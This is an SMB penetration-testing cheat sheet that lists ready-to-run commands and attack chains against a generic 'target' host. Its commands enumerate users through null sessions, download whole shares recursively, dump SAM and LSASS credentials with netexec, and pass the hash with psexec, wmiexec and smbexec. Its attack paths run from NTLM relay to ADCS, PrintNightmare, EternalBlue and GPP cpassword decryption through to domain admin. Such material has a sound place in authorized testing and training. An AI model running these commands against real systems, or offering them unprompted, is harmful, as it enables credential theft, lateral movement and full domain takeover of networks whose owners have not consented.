# SMB Battle Card

## What to Check First
```
1. NULL SESSION → smbclient -N -L //target
2. rpcclient -U "" -N target → enumdomusers, enumdomgroups, querydominfo
3. enum4linux -a target
4. SMB SIGNING → nmap --script smb2-security-mode -p 445 target
```

## High-Value Findings
- **Null session works** → Free users, shares, domain info
- **SMB signing disabled** → NTLM relay possible (ADCS relay = DA)
- **Writable share** → SCF attack, web shell upload, startup script
- **GPP cpassword** → gpp-decrypt → plaintext domain creds
- **PrintNightmare (CVE-2021-1675)** → SYSTEM on DC if patching missing
- **MS17-010 (EternalBlue)** → SYSTEM shell

## Immediate Commands
```
# Null session
rpcclient -U "" -N target -c "enumdomusers; enumdomgroups; querydominfo; getdompwinfo"
enum4linux -a target | tee enum4linux.log

# Share enumeration
smbmap -H target -u "" -p ""
smbclient -N -L //target
netexec smb target --shares -u "" -p ""

# Recursive download from open share
smbclient //target/share -N -c "prompt OFF; recurse ON; mget *"

# Signing check
nmap --script smb2-security-mode -p 445 target

# If creds obtained
netexec smb target -u user -p pass --shares
netexec smb target -u user -p pass --sam   # Dump SAM
netexec smb target -u user -p pass --lsass # Dump LSASS
netexec smb target -u user -p pass --sessions # Active sessions
smbmap -H target -u user -p pass -R sharename

# Pass-the-Hash
psexec.py -hashes :hash domain/user@target
wmiexec.py -hashes :hash domain/user@target
smbexec.py -hashes :hash domain/user@target
```

## Common Attack Paths
```
NULL SESSION → Users → Password Spray → WinRM/SMB → Shell
NULL SESSION → Readable Share → Configs/Creds → Lateral Movement
SMB SIGNING OFF → Responder → NTLM Relay → ADCS → DA
WRITABLE SHARE → SCF Attack → Captured Hash → Relay/ Crack
CREDENTIALS → PSExec → SYSTEM → LSASS Dump → More Creds
MS17-010 → SYSTEM Shell → Dump SAM → Lateral
```

## Escalation Paths
- **Admin creds** → PSExec/WMIexec → SYSTEM
- **SYSTEM on host** → Dump LSASS → Domain creds → DA target
- **Writable share on DC** → SYSVOL write → GPO abuse → DA
- **PrintNightmare** → SYSTEM on DC directly

## When to Stop
- Null session blocked AND signing required AND no vulns AND no creds
- Move to LDAP, Kerberos, or web application attacks instead

## Common Mistakes
- Forgetting to check `rpcclient` null session (separate from SMB shares)
- Not recursively downloading all share contents
- Ignoring SMB signing check (missed relay opportunities)
- Not checking for GPP passwords in SYSVOL
- Dumping SAM when LSASS contains domain creds (or vice versa)
- Forgetting Pass-the-Hash with service accounts
